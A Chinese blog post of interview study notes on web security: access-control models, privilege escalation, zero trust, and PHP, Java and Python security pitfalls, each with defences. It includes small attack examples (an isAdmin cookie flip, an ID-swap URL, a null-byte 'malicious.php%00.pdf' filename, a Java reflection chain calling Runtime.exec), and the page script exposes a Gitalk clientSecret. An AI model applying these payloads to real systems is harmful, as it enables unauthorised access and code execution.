<h2 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h2><p>Role-Based Access Control, RBAC</p>
<p>‍</p>
<h3 id="基于属性的访问控制"><a href="#基于属性的访问控制" class="headerlink" title="基于属性的访问控制"></a>基于属性的访问控制</h3><p>Attribute-Based Access Control</p>
<p>系统根据主体，客体，以及环境等属性动态计算一个布尔表达式，以判断主体有没有操作权限</p>
<p>比如：银行允许财务人员在工作时间访问某财务系统</p>
<p>‍</p>
<p>‍</p>
<h2 id="越权访问漏洞"><a href="#越权访问漏洞" class="headerlink" title="越权访问漏洞"></a>越权访问漏洞</h2><p>垂直越权访问：比如普通用户可以拥有admin的权限，比如在header或cookie里，isAdmin=0改成isAdmin=1就越权了</p>
<p>解决方法：比如在RBAC模型中，在进行具体操作的时候，采用安全的方式校验访问者的角色</p>
<p>‍</p>
<p>水平越权访问：比如用户A可以访问用户B 的私有数据。比如<a target="_blank" rel="noopener" href="http://test.com/order?id=1234%EF%BC%8C%E6%94%B9%E4%B8%AAID%E5%B0%B1%E8%AE%BF%E9%97%AE%E5%88%B0%E5%88%AB%E4%BA%BA%E7%9A%84%E4%BA%86">http://test.com/order?id=1234，改个ID就访问到别人的了</a></p>
<p>解决方法：↓</p>
<ol>
<li>文件名，UID啥的，都随机化，让攻击者不可预测</li>
<li>服务器应当从session中或者JWT中获取UID，而不是用户直接写个明文的UID进行request</li>
<li>对于重要的数据库，在后台SQL日志看有没有对数据的操作未带上UID作为WHERE语句的条件，这种有可能造成水平越权访问</li>
<li>审计用户的访问行为，看看有没有异常的批量访问行为。</li>
</ol>
<p>‍</p>
<p>‍</p>
<h2 id="零信任模型"><a href="#零信任模型" class="headerlink" title="零信任模型"></a>零信任模型</h2><p>零信任模型遵循的原则↓</p>
<p>显示验证：默认不信任原则，在整个过程中持续的校验访问者的安全属性，比如账号，设备，网络环境等</p>
<p>最小权限：在零信任访问模型中也需要遵循“最小权限”原则吗仅仅授予主体完成工作的最小权限，如果权限不需要时，应及时撤销</p>
<p>敌情想定：假设所有网络环境都是不安全的，基于这个假设去设计身份认证、数据加密、访问控制等方案</p>
<p>‍</p>
<p>零信任访问架构分为控制平面 和 数据平面两个部分</p>
<p>‍</p>
<h1 id="开发语言的安全"><a href="#开发语言的安全" class="headerlink" title="开发语言的安全"></a>开发语言的安全</h1><h2 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h2><p><strong>变量覆盖</strong>：早期的PHP中，如果配置文件中定义了register_globals=On，就会把参数中的元素注册为全局变量</p>
<p>….test.php?admin=1—-&gt; $admin=1</p>
<p>PHP5.4之后废除了这个特性</p>
<p>PHP的extract函数也可以将数组中的元素注册到当前上下文，而且这个extract()函数在各个PHP版本中都存在，使用时要格外小心</p>
<p>‍</p>
<p><strong>空字节问题</strong></p>
<p>filename=malicious.php%00.pdf</p>
<p>底层C语言处理就是malicious.php，PHP5.3修复了这个漏洞</p>
<p>‍</p>
<p><strong>弱类型</strong></p>
<p>=== 和 == 的区别</p>
<p>‍</p>
<p><strong>反序列化</strong></p>
<p>对不可信的数据进行反序列化，可能被攻击者利用</p>
<p>‍</p>
<h2 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h2><p>java的反射机制可以用来反序列化，反射机制就是可以动态获取类的属性和方法，动态调用对象的属性和方法</p>
<p>比如</p>
<p>Class clazz = Class.forName(“java.lang.Runtime”)</p>
<p>Method getRuntimeMethod = clazz.getMethod(“getRuntime”)</p>
<p>Object runtimeObject = getRuntimeMethod.invoke(clazz)</p>
<p>Method execMethod = clazz.getMethod(“exec”, String.class)</p>
<p>execMethod.invoke(runtimeObject, “open /…/…/Calculator.app”)</p>
<p>‍</p>
<p>我们可以根据内部处理逻辑，构造序列化的对象，然后在内部反序列化的过程中，就会执行类似上面这些代码</p>
<p>‍</p>
<p>作为开发者如何防止？</p>
<p>尽可能用高版本的库，然后可以用黑白名单的机制，仅仅反序列化特定的对象或者禁止反序列化某种类型的对象</p>
<p>如果序列化后的数据存在客户端，可以对其进行签名，收到数据后先校验签名再执行反序列化操作</p>
<h2 id="Python安全"><a href="#Python安全" class="headerlink" title="Python安全"></a>Python安全</h2><p>python的反序列化，利用pickle库，pythond的__reduce__(self)在反序列化的时候会自动被调用</p>
<p>它返回一个至少包含2个元素的数组，第一个元素是类或者函数，第二个元素是类的构造函数的参数 或 函数的参数</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">zsky</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zzzzsky.github.io/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">https://zzzzsky.github.io/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zzzzsky.github.io" target="_blank">zsky's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%A7%8B%E6%8B%9B/">秋招</a><a class="post-meta__tags" href="/tags/WEB/">WEB</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?jinjiuyinshi_web" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/06/2023%E7%A7%8B%E6%8B%9B_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"><img class="prev-cover" src="https://www.dmoe.cc/random.php?jinjiuyinshi_network" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023秋招_计算机网络准备</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/20/MDA2/"><img class="next-cover" src="https://www.dmoe.cc/random.php?mda2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MAS系列-MDA2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/14/2023%E7%A7%8B%E6%8B%9B_%E5%85%A8%E9%83%A8%E6%8A%95%E9%80%92/" title="2023秋招_我的秋招路线"><img class="cover" src="https://www.dmoe.cc/random.php?jinjiuyinshi_myqiuzhao" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-14</div><div class="title">2023秋招_我的秋招路线</div></div></a></div><div><a href="/2023/09/06/2023%E7%A7%8B%E6%8B%9B_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/" title="2023秋招_计算机网络准备"><img class="cover" src="https://www.dmoe.cc/random.php?jinjiuyinshi_network" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="title">2023秋招_计算机网络准备</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">XSS类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.1.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.1.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">1.1.3.</span> <span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BBpayload"><span class="toc-number">1.2.</span> <span class="toc-text">XSS攻击payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E8%8E%B7%E5%8F%96cookie"><span class="toc-number">1.2.1.</span> <span class="toc-text">XSS获取cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E9%92%93%E9%B1%BC"><span class="toc-number">1.2.2.</span> <span class="toc-text">XSS钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E8%A0%95%E8%99%AB"><span class="toc-number">1.2.3.</span> <span class="toc-text">XSS蠕虫</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E9%98%B2%E5%BE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">XSS防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">2.</span> <span class="toc-text">CSRF跨站请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%9C%AC%E8%B4%A8"><span class="toc-number">2.1.</span> <span class="toc-text">CSRF本质</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1CSRF"><span class="toc-number">2.2.</span> <span class="toc-text">防御CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.2.2.</span> <span class="toc-text">Referer校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7"><span class="toc-number">2.2.3.</span> <span class="toc-text">Cookie的SameSite属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Anti-CSRF-Token"><span class="toc-number">2.2.4.</span> <span class="toc-text">Anti-CSRF Token</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">点击劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Frame-Busting"><span class="toc-number">3.3.</span> <span class="toc-text">Frame Busting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">Cookie的SameSite属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP-frame-ancestors"><span class="toc-number">3.3.2.</span> <span class="toc-text">CSP: frame-ancestors</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">SQL注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.</span> <span class="toc-text">最常规注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Union%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.2.</span> <span class="toc-text">Union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.3.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.4.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.1.</span> <span class="toc-text">布尔型盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.2.</span> <span class="toc-text">延时盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.3.</span> <span class="toc-text">带外数据注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7"><span class="toc-number">4.4.</span> <span class="toc-text">SQL注入技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">预防SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5"><span class="toc-number">4.5.1.</span> <span class="toc-text">使用预编译语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">4.5.2.</span> <span class="toc-text">使用存储过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C"><span class="toc-number">4.5.3.</span> <span class="toc-text">参数校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%89%E5%85%A8%E5%87%BD%E6%95%B0"><span class="toc-number">4.5.4.</span> <span class="toc-text">使用安全函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">其他注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">NoSQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">XML注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.1.</span> <span class="toc-text">XXE外部实体注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">CRLF注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.</span> <span class="toc-text">LDAP注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">6.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">6.1.</span> <span class="toc-text">SSRF漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%94%BB%E5%87%BB%E8%BF%9B%E9%98%B6"><span class="toc-number">6.2.</span> <span class="toc-text">SSRF攻击进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="toc-number">6.2.1.</span> <span class="toc-text">访问内网应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">6.2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%9EWEB%E5%BA%94%E7%94%A8"><span class="toc-number">6.2.3.</span> <span class="toc-text">攻击非WEB应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">6.2.4.</span> <span class="toc-text">绕过技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">6.3.</span> <span class="toc-text">SSRF防御方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">7.</span> <span class="toc-text">身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">7.1.</span> <span class="toc-text">身份认证的方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E6%92%9E%E5%BA%93"><span class="toc-number">7.2.</span> <span class="toc-text">暴力破解和撞库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95"><span class="toc-number">7.3.</span> <span class="toc-text">单点登录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth"><span class="toc-number">7.3.1.</span> <span class="toc-text">OAuth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OIDC"><span class="toc-number">7.3.2.</span> <span class="toc-text">OIDC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAML"><span class="toc-number">7.3.3.</span> <span class="toc-text">SAML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CAS"><span class="toc-number">7.3.4.</span> <span class="toc-text">CAS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">8.</span> <span class="toc-text">访问控制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B"><span class="toc-number">8.1.</span> <span class="toc-text">访问控制模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E4%B8%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B"><span class="toc-number">8.1.1.</span> <span class="toc-text">自主访问控制模型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A7%92%E8%89%B2%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">8.2.</span> <span class="toc-text">基于角色的访问控制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B1%9E%E6%80%A7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">8.2.1.</span> <span class="toc-text">基于属性的访问控制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.3.</span> <span class="toc-text">越权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%A8%A1%E5%9E%8B"><span class="toc-number">8.4.</span> <span class="toc-text">零信任模型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AE%89%E5%85%A8"><span class="toc-number">9.</span> <span class="toc-text">开发语言的安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%AE%89%E5%85%A8"><span class="toc-number">9.1.</span> <span class="toc-text">PHP安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%AE%89%E5%85%A8"><span class="toc-number">9.2.</span> <span class="toc-text">JAVA安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%89%E5%85%A8"><span class="toc-number">9.3.</span> <span class="toc-text">Python安全</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By zsky</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'e2ad1e02c5234921e4ca',
      clientSecret: '5b3decb222a8aed9f74426b2d5a9136ec0a6ce46',
      repo: 'zzzzsky.github.io',
      owner: 'zzzzsky',
      admin: ['zzzzsky'],
      id: 'f670098f430127d4f1821b5a1f22cef1',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: true,
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>